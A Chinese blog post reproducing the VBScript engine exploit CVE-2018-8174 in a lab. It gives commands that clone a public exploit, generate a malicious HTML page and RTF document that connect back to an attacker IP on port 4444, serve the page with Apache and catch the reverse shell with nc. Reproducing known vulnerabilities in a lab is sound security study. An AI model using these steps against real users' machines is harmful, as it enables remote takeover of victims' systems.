# 双杀 0day 漏洞（CVE-2018-8174）复现 - Sch01aR# - 博客园

> 原文：[`www.cnblogs.com/sch01ar/p/9175578.html`](https://www.cnblogs.com/sch01ar/p/9175578.html)

# 漏洞描述：

CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。

微软在 4 月 20 日早上确认此漏洞，并于 5 月 8 号发布了官方安全补丁，对该 0day 漏洞进行了修复，将其命名为 CVE-2018-8174

由于 VBScript 脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的 VBScript 嵌入到 Office 文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码。

# 漏洞复现：

攻击机 IP：192.168.220.160

靶机 IP：192.168.220.161

项目地址：https://github.com/Sch01ar/CVE-2018-8174_EXP

```
┌─[root@sch01ar]─[/sch01ar]
└──╼ #git clone https://github.com/Sch01ar/CVE-2018-8174_EXP

```

ls 看一下

![](img/4a27402cb56aebfc0e3e65923713d0b0.png)

生成带有恶意 VBscript 的 html 页面和 word 文档

```
┌─[root@sch01ar]─[/sch01ar/CVE-2018-8174_EXP]
└──╼ #python CVE-2018-8174.py -u http://192.168.220.160/exploit.html -o msf.rtf -i 192.168.220.160 -p 4444

```

-u：URL 地址

-o：生成文档

-i：监听地址

-p：监听端口

![](img/b3d53c14fb311ee8cb96db20787cbfe8.png)

查看一下生成的文件

![](img/34dc38b110c0297c5b7434ffdfbe5876.png)

把 explot.html 复制到 /var/www/html，并开启 apache 服务

```
┌─[root@sch01ar]─[/sch01ar/CVE-2018-8174_EXP]
└──╼ #cp exploit.html /var/www/html
┌─[root@sch01ar]─[/sch01ar/CVE-2018-8174_EXP]
└──╼ #service apache2 start

```

用 nc 监听 4444 端口

![](img/4579b24848a607dc92f97162e4a12c49.png)

用靶机的 IE 浏览器打开恶意 URL

![](img/5c0dc789ccb83d144d2169cdf7ebd796.png)

攻击机收到靶机的 shell 会话

![](img/bf8aecf13b7bd187c743270d7726984e.png)

在靶机用 word 打开 msf.rtf

![](img/3b0aced50212571e036fd39d73a84af3.png)

攻击机同样也收到会话

![](img/8adc51a83aed1848d7456ba625f385b8.png)